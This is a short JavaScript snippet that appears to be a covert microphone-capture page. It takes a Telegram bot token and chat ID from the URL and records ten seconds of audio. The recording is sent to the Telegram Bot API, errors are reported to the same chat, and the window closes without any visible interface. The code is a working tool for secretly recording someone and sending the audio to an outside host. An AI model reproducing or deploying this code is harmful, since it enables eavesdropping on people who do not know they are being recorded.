(async () => {
  const params = new URLSearchParams(window.location.search);
  const BOT = params.get('bot');
  const CID = params.get('chat');
  if (!BOT || !CID) { window.close(); return; }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
    const chunks = [];
    mediaRecorder.ondataavailable = e => chunks.push(e.data);
    mediaRecorder.onstop = async () => {
      const blob = new Blob(chunks, { type: 'audio/ogg' });
      const fd = new FormData();
      fd.append('chat_id', CID);
      fd.append('voice', blob, 'recording.ogg');
      await fetch(`https://api.telegram.org/bot${BOT}/sendVoice`, { method: 'POST', body: fd });
      stream.getTracks().forEach(t => t.stop());
      window.close();
    };
    mediaRecorder.start();
    setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 10000);
  } catch (e) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CID, text: `🎤 Mic error: ${e.message}` })
      });
    } catch(_) {}
    window.close();
  }
})();